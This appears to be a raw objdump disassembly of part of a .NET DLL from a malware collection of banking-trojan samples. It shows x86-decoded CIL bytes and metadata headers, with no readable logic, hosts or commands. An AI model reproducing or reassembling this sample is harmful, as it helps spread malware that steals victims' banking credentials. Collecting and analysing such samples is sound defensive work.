
malware_samples/banker/0d399c4818db396b7b05a90f80362b9bb0c7479db26605b1b0308513615eec46.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	7c 37                	jl     0x10002039
10002002:	00 00                	add    %al,(%eax)
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 64 25 00    	add    %al,0x256400
10002013:	00 e4                	add    %ah,%ah
10002015:	11 00                	adc    %eax,(%eax)
10002017:	00 01                	add    %al,(%ecx)
	...
1000204d:	00 00                	add    %al,(%eax)
1000204f:	00 13                	add    %dl,(%ebx)
10002051:	30 02                	xor    %al,(%edx)
10002053:	00 48 00             	add    %cl,0x0(%eax)
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	7e 05                	jle    0x10002063
1000205e:	00 00                	add    %al,(%eax)
10002060:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
10002066:	16                   	push   %ss
10002067:	80 0b 00             	orb    $0x0,(%ebx)
1000206a:	00 04 00             	add    %al,(%eax,%eax,1)
1000206d:	28 06                	sub    %al,(%esi)
1000206f:	00 00                	add    %al,(%eax)
10002071:	0a 0a                	or     (%edx),%cl
10002073:	72 01                	jb     0x10002076
10002075:	00 00                	add    %al,(%eax)
10002077:	70 28                	jo     0x100020a1
10002079:	0c 00                	or     $0x0,%al
1000207b:	00 06                	add    %al,(%esi)
1000207d:	00 7e 16             	add    %bh,0x16(%esi)
10002080:	00 00                	add    %al,(%eax)
10002082:	04 fe                	add    $0xfe,%al
10002084:	06                   	push   %es
10002085:	1c 00                	sbb    $0x0,%al
10002087:	00 06                	add    %al,(%esi)
10002089:	73 07                	jae    0x10002092
1000208b:	00 00                	add    %al,(%eax)
1000208d:	0a 73 08             	or     0x8(%ebx),%dh
10002090:	00 00                	add    %al,(%eax)
10002092:	0a 0b                	or     (%ebx),%cl
10002094:	07                   	pop    %es
10002095:	17                   	pop    %ss
10002096:	6f                   	outsl  %ds:(%esi),(%dx)
10002097:	09 00                	or     %eax,(%eax)
10002099:	00 0a                	add    %cl,(%edx)
1000209b:	00 07                	add    %al,(%edi)
1000209d:	6f                   	outsl  %ds:(%esi),(%dx)
1000209e:	0a 00                	or     (%eax),%al
100020a0:	00 0a                	add    %cl,(%edx)
100020a2:	00 2a                	add    %ch,(%edx)
100020a4:	1b 30                	sbb    (%eax),%esi
100020a6:	05 00 a9 00 00       	add    $0xa900,%eax
100020ab:	00 02                	add    %al,(%edx)
100020ad:	00 00                	add    %al,(%eax)
100020af:	11 00                	adc    %eax,(%eax)
100020b1:	02 19                	add    (%ecx),%bl
100020b3:	17                   	pop    %ss
100020b4:	17                   	pop    %ss
100020b5:	20 00                	and    %al,(%eax)
100020b7:	00 00                	add    %al,(%eax)
100020b9:	40                   	inc    %eax
100020ba:	73 0b                	jae    0x100020c7
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 0a                	or     (%edx),%cl
100020c0:	00 38                	add    %bh,(%eax)
100020c2:	80 00 00             	addb   $0x0,(%eax)
100020c5:	00 00                	add    %al,(%eax)
100020c7:	06                   	push   %es
100020c8:	6f                   	outsl  %ds:(%esi),(%dx)
100020c9:	0c 00                	or     $0x0,%al
100020cb:	00 0a                	add    %cl,(%edx)
100020cd:	00 1a                	add    %bl,(%edx)
100020cf:	8d 16                	lea    (%esi),%edx
100020d1:	00 00                	add    %al,(%eax)
100020d3:	01 0b                	add    %ecx,(%ebx)
100020d5:	2b 62 00             	sub    0x0(%edx),%esp
100020d8:	06                   	push   %es
100020d9:	07                   	pop    %es
100020da:	16                   	push   %ss
100020db:	1a 6f 0d             	sbb    0xd(%edi),%ch
100020de:	00 00                	add    %al,(%eax)
100020e0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
100020e3:	1a fe                	sbb    %dh,%bh
100020e5:	01 16                	add    %edx,(%esi)
100020e7:	fe 01                	incb   (%ecx)
100020e9:	13 04 11             	adc    (%ecx,%edx,1),%eax
100020ec:	04 2c                	add    $0x2c,%al
100020ee:	02 2b                	add    (%ebx),%ch
100020f0:	4d                   	dec    %ebp
100020f1:	07                   	pop    %es
100020f2:	16                   	push   %ss
100020f3:	28 0e                	sub    %cl,(%esi)
100020f5:	00 00                	add    %al,(%eax)
100020f7:	0a 0d 09 17 fe 01    	or     0x1fe1709,%cl
100020fd:	13 05 11 05 2c 18    	adc    0x182c0511,%eax
10002103:	00 7e 0b             	add    %bh,0xb(%esi)
10002106:	00 00                	add    %al,(%eax)
10002108:	04 16                	add    $0x16,%al
1000210a:	fe 01                	incb   (%ecx)
1000210c:	13 06                	adc    (%esi),%eax
1000210e:	11 06                	adc    %eax,(%esi)
10002110:	2c 06                	sub    $0x6,%al
10002112:	28 0e                	sub    %cl,(%esi)
10002114:	00 00                	add    %al,(%eax)
10002116:	06                   	push   %es
10002117:	00 00                	add    %al,(%eax)
10002119:	2b 1d 09 16 fe 01    	sub    0x1fe1609,%ebx
1000211f:	13 07                	adc    (%edi),%eax
10002121:	11 07                	adc    %eax,(%edi)
10002123:	2c 13                	sub    $0x13,%al
10002125:	00 7e 0b             	add    %bh,0xb(%esi)
10002128:	00 00                	add    %al,(%eax)
1000212a:	04 13                	add    $0x13,%al
1000212c:	08 11                	or     %dl,(%ecx)
1000212e:	08 2c 06             	or     %ch,(%esi,%eax,1)
10002131:	28 0f                	sub    %cl,(%edi)
10002133:	00 00                	add    %al,(%eax)
10002135:	06                   	push   %es
10002136:	00 00                	add    %al,(%eax)
10002138:	00 17                	add    %dl,(%edi)
1000213a:	13 09                	adc    (%ecx),%ecx
1000213c:	2b 99 06 6f 0f 00    	sub    0xf6f06(%ecx),%ebx
10002142:	00 0a                	add    %cl,(%edx)
10002144:	00 00                	add    %al,(%eax)
10002146:	17                   	pop    %ss
10002147:	13 0a                	adc    (%edx),%ecx
10002149:	38 78 ff             	cmp    %bh,-0x1(%eax)
1000214c:	ff                   	(bad)
1000214d:	ff 06                	incl   (%esi)
1000214f:	2c 07                	sub    $0x7,%al
10002151:	06                   	push   %es
10002152:	6f                   	outsl  %ds:(%esi),(%dx)
10002153:	10 00                	adc    %al,(%eax)
10002155:	00 0a                	add    %cl,(%edx)
10002157:	00 dc                	add    %bl,%ah
10002159:	00 00                	add    %al,(%eax)
1000215b:	00 01                	add    %al,(%ecx)
1000215d:	10 00                	adc    %al,(%eax)
1000215f:	00 02                	add    %al,(%edx)
10002161:	00 10                	add    %dl,(%eax)
10002163:	00 8e 9e 00 0b 00    	add    %cl,0xb009e(%esi)
10002169:	00 00                	add    %al,(%eax)
1000216b:	00 1b                	add    %bl,(%ebx)
1000216d:	30 02                	xor    %al,(%edx)
1000216f:	00 a5 00 00 00 03    	add    %ah,0x3000000(%ebp)
10002175:	00 00                	add    %al,(%eax)
10002177:	11 00                	adc    %eax,(%eax)
10002179:	00 7e 0b             	add    %bh,0xb(%esi)
1000217c:	00 00                	add    %al,(%eax)
1000217e:	04 0b                	add    $0xb,%al
10002180:	07                   	pop    %es
10002181:	2c 05                	sub    $0x5,%al
10002183:	dd 94 00 00 00 28 10 	fstl   0x10280000(%eax,%eax,1)
1000218a:	00 00                	add    %al,(%eax)
1000218c:	06                   	push   %es
1000218d:	00 16                	add    %dl,(%esi)
1000218f:	0a 2b                	or     (%ebx),%ch
10002191:	0e                   	push   %cs
10002192:	00 1f                	add    %bl,(%edi)
10002194:	32 28                	xor    (%eax),%ch
10002196:	11 00                	adc    %eax,(%eax)
10002198:	00 0a                	add    %cl,(%edx)
1000219a:	00 06                	add    %al,(%esi)
1000219c:	17                   	pop    %ss
1000219d:	58                   	pop    %eax
1000219e:	0a 00                	or     (%eax),%al
100021a0:	7e 09                	jle    0x100021ab
100021a2:	00 00                	add    %al,(%eax)
100021a4:	04 7e                	add    $0x7e,%al
100021a6:	05 00 00 0a 28       	add    $0x280a0000,%eax
100021ab:	12 00                	adc    (%eax),%al
100021ad:	00 0a                	add    %cl,(%edx)
100021af:	2c 07                	sub    $0x7,%al
100021b1:	06                   	push   %es
100021b2:	1f                   	pop    %ds
100021b3:	32 fe                	xor    %dh,%bh
100021b5:	04 2b                	add    $0x2b,%al
100021b7:	01 16                	add    %edx,(%esi)
100021b9:	0c 08                	or     $0x8,%al
100021bb:	2d d5 7e 09 00       	sub    $0x97ed5,%eax
100021c0:	00 04 7e             	add    %al,(%esi,%edi,2)
100021c3:	05 00 00 0a 28       	add    $0x280a0000,%eax
100021c8:	12 00                	adc    (%eax),%al
100021ca:	00 0a                	add    %cl,(%edx)
100021cc:	0d 09 2c 0e 00       	or     $0xe2c09,%eax
100021d1:	72 59                	jb     0x1000222c
100021d3:	00 00                	add    %al,(%eax)
100021d5:	70 28                	jo     0x100021ff
100021d7:	0c 00                	or     $0x0,%al
100021d9:	00 06                	add    %al,(%esi)
100021db:	00 de                	add    %bl,%dh
100021dd:	3e 17                	ds pop %ss
100021df:	28 02                	sub    %al,(%edx)
100021e1:	00 00                	add    %al,(%eax)
100021e3:	06                   	push   %es
100021e4:	26 28 13             	sub    %dl,%es:(%ebx)
100021e7:	00 00                	add    %al,(%eax)
100021e9:	06                   	push   %es
100021ea:	00 17                	add    %dl,(%edi)
100021ec:	80 0b 00             	orb    $0x0,(%ebx)
100021ef:	00 04 72             	add    %al,(%edx,%esi,2)
100021f2:	b3 00                	mov    $0x0,%bl
100021f4:	00 70 28             	add    %dh,0x28(%eax)
100021f7:	0c 00                	or     $0x0,%al
100021f9:	00 06                	add    %al,(%esi)
100021fb:	00 00                	add    %al,(%eax)
100021fd:	de 1d 13 04 00 72    	ficomps 0x72000413
10002203:	fb                   	sti
10002204:	00 00                	add    %al,(%eax)
10002206:	70 11                	jo     0x10002219
10002208:	04 6f                	add    $0x6f,%al
1000220a:	13 00                	adc    (%eax),%eax
1000220c:	00 0a                	add    %cl,(%edx)
1000220e:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002211:	00 0a                	add    %cl,(%edx)
10002213:	28 0c 00             	sub    %cl,(%eax,%eax,1)
10002216:	00 06                	add    %al,(%esi)
10002218:	00 00                	add    %al,(%eax)
1000221a:	de 00                	fiadds (%eax)
1000221c:	2a 00                	sub    (%eax),%al
1000221e:	00 00                	add    %al,(%eax)
10002220:	01 10                	add    %edx,(%eax)
10002222:	00 00                	add    %al,(%eax)
10002224:	00 00                	add    %al,(%eax)
10002226:	01 00                	add    %eax,(%eax)
10002228:	86 87 00 1d 09 00    	xchg   %al,0x91d00(%edi)
1000222e:	00 01                	add    %al,(%ecx)
10002230:	1b 30                	sbb    (%eax),%esi
10002232:	02 00                	add    (%eax),%al
10002234:	5a                   	pop    %edx
10002235:	00 00                	add    %al,(%eax)
10002237:	00 04 00             	add    %al,(%eax,%eax,1)
1000223a:	00 11                	add    %dl,(%ecx)
1000223c:	00 00                	add    %al,(%eax)
1000223e:	7e 0b                	jle    0x1000224b
10002240:	00 00                	add    %al,(%eax)
10002242:	04 16                	add    $0x16,%al
10002244:	fe 01                	incb   (%ecx)
10002246:	0a 06                	or     (%esi),%al
10002248:	2c 02                	sub    $0x2,%al
1000224a:	de 49 28             	fimuls 0x28(%ecx)
1000224d:	14 00                	adc    $0x0,%al
1000224f:	00 06                	add    %al,(%esi)
10002251:	00 16                	add    %dl,(%esi)
10002253:	28 02                	sub    %al,(%edx)
10002255:	00 00                	add    %al,(%eax)
10002257:	06                   	push   %es
10002258:	26 17                	es pop %ss
1000225a:	28 09                	sub    %cl,(%ecx)
1000225c:	00 00                	add    %al,(%eax)
1000225e:	06                   	push   %es
1000225f:	26 28 11             	sub    %dl,%es:(%ecx)
10002262:	00 00                	add    %al,(%eax)
10002264:	06                   	push   %es
10002265:	00 16                	add    %dl,(%esi)
10002267:	80 0b 00             	orb    $0x0,(%ebx)
1000226a:	00 04 72             	add    %al,(%edx,%esi,2)
1000226d:	41                   	inc    %ecx
1000226e:	01 00                	add    %eax,(%eax)
10002270:	70 28                	jo     0x1000229a
10002272:	0c 00                	or     $0x0,%al
10002274:	00 06                	add    %al,(%esi)
10002276:	00 00                	add    %al,(%eax)
10002278:	de 1b                	ficomps (%ebx)
1000227a:	0b 00                	or     (%eax),%eax
1000227c:	72 8f                	jb     0x1000220d
1000227e:	01 00                	add    %eax,(%eax)
10002280:	70 07                	jo     0x10002289
10002282:	6f                   	outsl  %ds:(%esi),(%dx)
10002283:	13 00                	adc    (%eax),%eax
10002285:	00 0a                	add    %cl,(%edx)
10002287:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000228a:	00 0a                	add    %cl,(%edx)
1000228c:	28 0c 00             	sub    %cl,(%eax,%eax,1)
1000228f:	00 06                	add    %al,(%esi)
10002291:	00 00                	add    %al,(%eax)
10002293:	de 00                	fiadds (%eax)
10002295:	2a 00                	sub    (%eax),%al
10002297:	00 01                	add    %al,(%ecx)
10002299:	10 00                	adc    %al,(%eax)
1000229b:	00 00                	add    %al,(%eax)
1000229d:	00 01                	add    %al,(%ecx)
1000229f:	00 3d 3e 00 1b 09    	add    %bh,0x91b003e
100022a5:	00 00                	add    %al,(%eax)
100022a7:	01 13                	add    %edx,(%ebx)
100022a9:	30 0c 00             	xor    %cl,(%eax,%eax,1)
100022ac:	3c 01                	cmp    $0x1,%al
100022ae:	00 00                	add    %al,(%eax)
100022b0:	05 00 00 11 00       	add    $0x110000,%eax
100022b5:	14 fe                	adc    $0xfe,%al
100022b7:	06                   	push   %es
100022b8:	12 00                	adc    (%eax),%al
100022ba:	00 06                	add    %al,(%esi)
100022bc:	73 16                	jae    0x100022d4
100022be:	00 00                	add    %al,(%eax)
100022c0:	06                   	push   %es
100022c1:	80 08 00             	orb    $0x0,(%eax)
100022c4:	00 04 12             	add    %al,(%edx,%edx,1)
100022c7:	02 fe                	add    %dh,%bh
100022c9:	15 03 00 00 02       	adc    $0x2000003,%eax
100022ce:	12 02                	adc    (%edx),%al
100022d0:	7e 08                	jle    0x100022da
100022d2:	00 00                	add    %al,(%eax)
100022d4:	04 28                	add    $0x28,%al
100022d6:	01 00                	add    %eax,(%eax)
100022d8:	00 2b                	add    %ch,(%ebx)
100022da:	7d 0d                	jge    0x100022e9
100022dc:	00 00                	add    %al,(%eax)
100022de:	04 12                	add    $0x12,%al
100022e0:	02 14 28             	add    (%eax,%ebp,1),%dl
100022e3:	0b 00                	or     (%eax),%eax
100022e5:	00 06                	add    %al,(%esi)
100022e7:	7d 10                	jge    0x100022f9
100022e9:	00 00                	add    %al,(%eax)
100022eb:	04 12                	add    $0x12,%al
100022ed:	02 28                	add    (%eax),%ch
100022ef:	16                   	push   %ss
100022f0:	00 00                	add    %al,(%eax)
100022f2:	0a 0d 12 03 72 d7    	or     0xd7720312,%cl
100022f8:	01 00                	add    %eax,(%eax)
100022fa:	70 28                	jo     0x10002324
100022fc:	17                   	pop    %ss
100022fd:	00 00                	add    %al,(%eax)
100022ff:	0a 7d 15             	or     0x15(%ebp),%bh
10002302:	00 00                	add    %al,(%eax)
10002304:	04 12                	add    $0x12,%al
10002306:	02 17                	add    (%edi),%dl
10002308:	73 18                	jae    0x10002322
1000230a:	00 00                	add    %al,(%eax)
1000230c:	0a 7d 13             	or     0x13(%ebp),%bh
1000230f:	00 00                	add    %al,(%eax)
10002311:	04 08                	add    $0x8,%al
10002313:	0a 12                	or     (%edx),%dl
10002315:	00 28                	add    %ch,(%eax)
10002317:	06                   	push   %es
10002318:	00 00                	add    %al,(%eax)
1000231a:	06                   	push   %es
1000231b:	26 28 19             	sub    %bl,%es:(%ecx)
1000231e:	00 00                	add    %al,(%eax)
10002320:	0a 16                	or     (%esi),%dl
10002322:	9a 6f 1a 00 00 0a 0b 	lcall  $0xb0a,$0x1a6f
10002329:	17                   	pop    %ss
1000232a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
1000232d:	1a 07                	sbb    (%edi),%al
1000232f:	28 19                	sub    %bl,(%ecx)
10002331:	00 00                	add    %al,(%eax)
10002333:	0a 11                	or     (%ecx),%dl
10002335:	04 9a                	add    $0x9a,%al
10002337:	6f                   	outsl  %ds:(%esi),(%dx)
10002338:	1a 00                	sbb    (%eax),%al
1000233a:	00 0a                	add    %cl,(%edx)
1000233c:	28 1b                	sub    %bl,(%ebx)
1000233e:	00 00                	add    %al,(%eax)
10002340:	0a 0b                	or     (%ebx),%cl
10002342:	11 04 17             	adc    %eax,(%edi,%edx,1)
10002345:	58                   	pop    %eax
10002346:	13 04 11             	adc    (%ecx,%edx,1),%eax
10002349:	04 28                	add    $0x28,%al
1000234b:	19 00                	sbb    %eax,(%eax)
1000234d:	00 0a                	add    %cl,(%edx)
1000234f:	8e 69 fe             	mov    -0x2(%ecx),%gs
10002352:	04 13                	add    $0x13,%al
10002354:	05 11 05 2d d5       	add    $0xd52d0511,%eax
10002359:	20 a0 00 00 08 06    	and    %ah,0x6080000(%eax)
1000235f:	7b 15                	jnp    0x10002376
10002361:	00 00                	add    %al,(%eax)
10002363:	04 72                	add    $0x72,%al
10002365:	db 01                	fildl  (%ecx)
10002367:	00 70 20             	add    %dh,0x20(%eax)
1000236a:	00 00                	add    %al,(%eax)
1000236c:	00 90 12 01 28 1c    	add    %dl,0x1c280112(%eax)
10002372:	00 00                	add    %al,(%eax)
10002374:	0a 12                	or     (%edx),%dl
10002376:	01 28                	add    %ebp,(%eax)
10002378:	1d 00 00 0a 12       	sbb    $0x120a0000,%eax
1000237d:	01 28                	add    %ebp,(%eax)
1000237f:	1e                   	push   %ds
10002380:	00 00                	add    %al,(%eax)
10002382:	0a 12                	or     (%edx),%dl
10002384:	01 28                	add    %ebp,(%eax)
10002386:	1f                   	pop    %ds
10002387:	00 00                	add    %al,(%eax)
10002389:	0a 7e 05             	or     0x5(%esi),%bh
1000238c:	00 00                	add    %al,(%eax)
1000238e:	0a 7e 05             	or     0x5(%esi),%bh
10002391:	00 00                	add    %al,(%eax)
10002393:	0a 06                	or     (%esi),%al
10002395:	7b 10                	jnp    0x100023a7
10002397:	00 00                	add    %al,(%eax)
10002399:	04 7e                	add    $0x7e,%al
1000239b:	05 00 00 0a 28       	add    $0x280a0000,%eax
100023a0:	03 00                	add    (%eax),%eax
100023a2:	00 06                	add    %al,(%esi)
100023a4:	80 09 00             	orb    $0x0,(%ecx)
100023a7:	00 04 7e             	add    %al,(%esi,%edi,2)
100023aa:	09 00                	or     %eax,(%eax)
100023ac:	00 04 7e             	add    %al,(%esi,%edi,2)
100023af:	05 00 00 0a 28       	add    $0x280a0000,%eax
100023b4:	20 00                	and    %al,(%eax)
100023b6:	00 0a                	add    %cl,(%edx)
100023b8:	13 06                	adc    (%esi),%eax
100023ba:	11 06                	adc    %eax,(%esi)
100023bc:	2c 31                	sub    $0x31,%al
100023be:	00 7e 09             	add    %bh,0x9(%esi)
100023c1:	00 00                	add    %al,(%eax)
100023c3:	04 1b                	add    $0x1b,%al
100023c5:	28 04 00             	sub    %al,(%eax,%eax,1)
100023c8:	00 06                	add    %al,(%esi)
100023ca:	26 7e 09             	es jle 0x100023d6
100023cd:	00 00                	add    %al,(%eax)
100023cf:	04 28                	add    $0x28,%al
100023d1:	05 00 00 06 26       	add    $0x26060000,%eax
100023d6:	7e 09                	jle    0x100023e1
100023d8:	00 00                	add    %al,(%eax)
100023da:	04 1f                	add    $0x1f,%al
100023dc:	11 28                	adc    %ebp,(%eax)
100023de:	0a 00                	or     (%eax),%al
100023e0:	00 06                	add    %al,(%esi)
100023e2:	26 72 dd             	es jb  0x100023c2
100023e5:	01 00                	add    %eax,(%eax)
100023e7:	70 28                	jo     0x10002411
100023e9:	0c 00                	or     $0x0,%al
100023eb:	00 06                	add    %al,(%esi)
100023ed:	00 00                	add    %al,(%eax)
100023ef:	2a 13                	sub    (%ebx),%dl
100023f1:	30 02                	xor    %al,(%edx)
100023f3:	00 2c 00             	add    %ch,(%eax,%eax,1)
100023f6:	00 00                	add    %al,(%eax)
100023f8:	06                   	push   %es
100023f9:	00 00                	add    %al,(%eax)
100023fb:	11 00                	adc    %eax,(%eax)
100023fd:	7e 09                	jle    0x10002408
100023ff:	00 00                	add    %al,(%eax)
10002401:	04 7e                	add    $0x7e,%al
10002403:	05 00 00 0a 28       	add    $0x280a0000,%eax
10002408:	20 00                	and    %al,(%eax)
1000240a:	00 0a                	add    %cl,(%edx)
1000240c:	0a 06                	or     (%esi),%al
1000240e:	2c 17                	sub    $0x17,%al
10002410:	00 7e 09             	add    %bh,0x9(%esi)
10002413:	00 00                	add    %al,(%eax)
10002415:	04 28                	add    $0x28,%al
10002417:	07                   	pop    %es
10002418:	00 00                	add    %al,(%eax)
1000241a:	06                   	push   %es
1000241b:	26 7e 05             	es jle 0x10002423
1000241e:	00 00                	add    %al,(%eax)
10002420:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
10002426:	00 2a                	add    %ch,(%edx)
10002428:	13 30                	adc    (%eax),%esi
1000242a:	04 00                	add    $0x0,%al
1000242c:	21 00                	and    %eax,(%eax)
1000242e:	00 00                	add    %al,(%eax)
10002430:	07                   	pop    %es
10002431:	00 00                	add    %al,(%eax)
10002433:	11 00                	adc    %eax,(%eax)
10002435:	03 1f                	add    (%edi),%ebx
10002437:	20 fe                	and    %bh,%dh
10002439:	01 0a                	add    %ecx,(%edx)
1000243b:	06                   	push   %es
1000243c:	2c 09                	sub    $0x9,%al
1000243e:	17                   	pop    %ss
1000243f:	28 21                	sub    %ah,(%ecx)
10002441:	00 00                	add    %al,(%eax)
10002443:	0a 0b                	or     (%ebx),%cl
10002445:	2b 0c 02             	sub    (%edx,%eax,1),%ecx
10002448:	03 04 05 28 08 00 00 	add    0x828(,%eax,1),%eax
1000244f:	06                   	push   %es
10002450:	0b 2b                	or     (%ebx),%ebp
10002452:	00 07                	add    %al,(%edi)
10002454:	2a 00                	sub    (%eax),%al
10002456:	00 00                	add    %al,(%eax)
10002458:	13 30                	adc    (%eax),%esi
1000245a:	02 00                	add    (%eax),%al
1000245c:	42                   	inc    %edx
	...
10002465:	7e 17                	jle    0x1000247e
10002467:	00 00                	add    %al,(%eax)
10002469:	04 25                	add    $0x25,%al
1000246b:	2d 17 26 7e 16       	sub    $0x167e2617,%eax
10002470:	00 00                	add    %al,(%eax)
10002472:	04 fe                	add    $0xfe,%al
10002474:	06                   	push   %es
10002475:	1d 00 00 06 73       	sbb    $0x73060000,%eax
1000247a:	07                   	pop    %es
1000247b:	00 00                	add    %al,(%eax)
1000247d:	0a 25 80 17 00 00    	or     0x1780,%ah
10002483:	04 73                	add    $0x73,%al
10002485:	08 00                	or     %al,(%eax)
10002487:	00 0a                	add    %cl,(%edx)
10002489:	80 0a 00             	orb    $0x0,(%edx)
1000248c:	00 04 7e             	add    %al,(%esi,%edi,2)
1000248f:	0a 00                	or     (%eax),%al
10002491:	00 04 17             	add    %al,(%edi,%edx,1)
10002494:	6f                   	outsl  %ds:(%esi),(%dx)
10002495:	09 00                	or     %eax,(%eax)
10002497:	00 0a                	add    %cl,(%edx)
10002499:	00 7e 0a             	add    %bh,0xa(%esi)
1000249c:	00 00                	add    %al,(%eax)
1000249e:	04 6f                	add    $0x6f,%al
100024a0:	0a 00                	or     (%eax),%al
100024a2:	00 0a                	add    %cl,(%edx)
100024a4:	00 2a                	add    %ch,(%edx)
100024a6:	00 00                	add    %al,(%eax)
100024a8:	13 30                	adc    (%eax),%esi
100024aa:	02 00                	add    (%eax),%al
100024ac:	32 00                	xor    (%eax),%al
100024ae:	00 00                	add    %al,(%eax)
100024b0:	06                   	push   %es
100024b1:	00 00                	add    %al,(%eax)
100024b3:	11 00                	adc    %eax,(%eax)
100024b5:	7e 0a                	jle    0x100024c1
100024b7:	00 00                	add    %al,(%eax)
100024b9:	04 2c                	add    $0x2c,%al
100024bb:	0c 7e                	or     $0x7e,%al
100024bd:	0a 00                	or     (%eax),%al
100024bf:	00 04 6f             	add    %al,(%edi,%ebp,2)
100024c2:	22 00                	and    (%eax),%al
100024c4:	00 0a                	add    %cl,(%edx)
100024c6:	2b 01                	sub    (%ecx),%eax
100024c8:	16                   	push   %ss
100024c9:	0a 06                	or     (%esi),%al
100024cb:	2c 18                	sub    $0x18,%al
100024cd:	00 7e 0a             	add    %bh,0xa(%esi)
100024d0:	00 00                	add    %al,(%eax)
100024d2:	04 20                	add    $0x20,%al
100024d4:	e8 03 00 00 6f       	call   0x7f0024dc
100024d9:	23 00                	and    (%eax),%eax
100024db:	00 0a                	add    %cl,(%edx)
100024dd:	26 14 80             	es adc $0x80,%al
100024e0:	0a 00                	or     (%eax),%al
100024e2:	00 04 00             	add    %al,(%eax,%eax,1)
100024e5:	2a 22                	sub    (%edx),%ah
100024e7:	02 28                	add    (%eax),%ch
100024e9:	24 00                	and    $0x0,%al
100024eb:	00 0a                	add    %cl,(%edx)
100024ed:	00 2a                	add    %ch,(%edx)
100024ef:	2e 73 1b             	jae,pn 0x1000250d
100024f2:	00 00                	add    %al,(%eax)
100024f4:	06                   	push   %es
100024f5:	80 16 00             	adcb   $0x0,(%esi)
100024f8:	00 04 2a             	add    %al,(%edx,%ebp,1)
100024fb:	32 72 27             	xor    0x27(%edx),%dh
100024fe:	02 00                	add    (%eax),%al
10002500:	70 28                	jo     0x1000252a
10002502:	0d 00 00 06 00       	or     $0x60000,%eax
10002507:	2a 13                	sub    (%ebx),%dl
10002509:	30 02                	xor    %al,(%edx)
1000250b:	00 50 00             	add    %dl,0x0(%eax)
1000250e:	00 00                	add    %al,(%eax)
10002510:	08 00                	or     %al,(%eax)
10002512:	00 11                	add    %dl,(%ecx)
10002514:	00 16                	add    %dl,(%esi)
10002516:	0a 2b                	or     (%ebx),%ch
10002518:	0b 16                	or     (%esi),%edx
1000251a:	28 09                	sub    %cl,(%ecx)
1000251c:	00 00                	add    %al,(%eax)
1000251e:	06                   	push   %es
1000251f:	26 06                	es push %es
10002521:	17                   	pop    %ss
10002522:	58                   	pop    %eax
10002523:	0a 06                	or     (%esi),%al
10002525:	1f                   	pop    %ds
10002526:	0a fe                	or     %dh,%bh
10002528:	04 0b                	add    $0xb,%al
1000252a:	07                   	pop    %es
1000252b:	2d ec 2b 11 00       	sub    $0x112bec,%eax
10002530:	16                   	push   %ss
10002531:	28 09                	sub    %cl,(%ecx)
10002533:	00 00                	add    %al,(%eax)
10002535:	06                   	push   %es
10002536:	26 1f                	es pop %ds
10002538:	32 28                	xor    (%eax),%ch
1000253a:	11 00                	adc    %eax,(%eax)
1000253c:	00 0a                	add    %cl,(%edx)
1000253e:	00 00                	add    %al,(%eax)
10002540:	7e 0b                	jle    0x1000254d
10002542:	00 00                	add    %al,(%eax)
10002544:	04 0c                	add    $0xc,%al
10002546:	08 2d e6 16 0d 2b    	or     %ch,0x2b0d16e6
1000254c:	0b 17                	or     (%edi),%edx
1000254e:	28 09                	sub    %cl,(%ecx)
10002550:	00 00                	add    %al,(%eax)
10002552:	06                   	push   %es
10002553:	26 09 17             	or     %edx,%es:(%edi)
10002556:	58                   	pop    %eax
10002557:	0d 09 1f 0a fe       	or     $0xfe0a1f09,%eax
1000255c:	04 13                	add    $0x13,%al
1000255e:	04 11                	add    $0x11,%al
10002560:	04 2d                	add    $0x2d,%al
10002562:	ea 2a 42 53 4a 42 01 	ljmp   $0x142,$0x4a53422a
10002569:	00 01                	add    %al,(%ecx)
1000256b:	00 00                	add    %al,(%eax)
1000256d:	00 00                	add    %al,(%eax)
1000256f:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002572:	00 00                	add    %al,(%eax)
10002574:	76 34                	jbe    0x100025aa
10002576:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002579:	33 30                	xor    (%eax),%esi
1000257b:	33 31                	xor    (%ecx),%esi
1000257d:	39 00                	cmp    %eax,(%eax)
1000257f:	00 00                	add    %al,(%eax)
10002581:	00 05 00 6c 00 00    	add    %al,0x6c00
10002587:	00 78 06             	add    %bh,0x6(%eax)
1000258a:	00 00                	add    %al,(%eax)
1000258c:	23 7e 00             	and    0x0(%esi),%edi
1000258f:	00 e4                	add    %ah,%ah
10002591:	06                   	push   %es
10002592:	00 00                	add    %al,(%eax)
10002594:	f4                   	hlt
10002595:	06                   	push   %es
10002596:	00 00                	add    %al,(%eax)
10002598:	23 53 74             	and    0x74(%ebx),%edx
1000259b:	72 69                	jb     0x10002606
1000259d:	6e                   	outsb  %ds:(%esi),(%dx)
1000259e:	67 73 00             	addr16 jae 0x100025a1
100025a1:	00 00                	add    %al,(%eax)
100025a3:	00 d8                	add    %bl,%al
100025a5:	0d 00 00 3c 02       	or     $0x23c0000,%eax
100025aa:	00 00                	add    %al,(%eax)
100025ac:	23 55 53             	and    0x53(%ebp),%edx
100025af:	00 14 10             	add    %dl,(%eax,%edx,1)
100025b2:	00 00                	add    %al,(%eax)
100025b4:	10 00                	adc    %al,(%eax)
100025b6:	00 00                	add    %al,(%eax)
100025b8:	23 47 55             	and    0x55(%edi),%eax
100025bb:	49                   	dec    %ecx
100025bc:	44                   	inc    %esp
100025bd:	00 00                	add    %al,(%eax)
100025bf:	00 24 10             	add    %ah,(%eax,%edx,1)
100025c2:	00 00                	add    %al,(%eax)
100025c4:	c0 01 00             	rolb   $0x0,(%ecx)
100025c7:	00 23                	add    %ah,(%ebx)
100025c9:	42                   	inc    %edx
100025ca:	6c                   	insb   (%dx),%es:(%edi)
100025cb:	6f                   	outsl  %ds:(%esi),(%dx)
100025cc:	62 00                	bound  %eax,(%eax)
100025ce:	00 00                	add    %al,(%eax)
100025d0:	00 00                	add    %al,(%eax)
100025d2:	00 00                	add    %al,(%eax)
100025d4:	02 00                	add    (%eax),%al
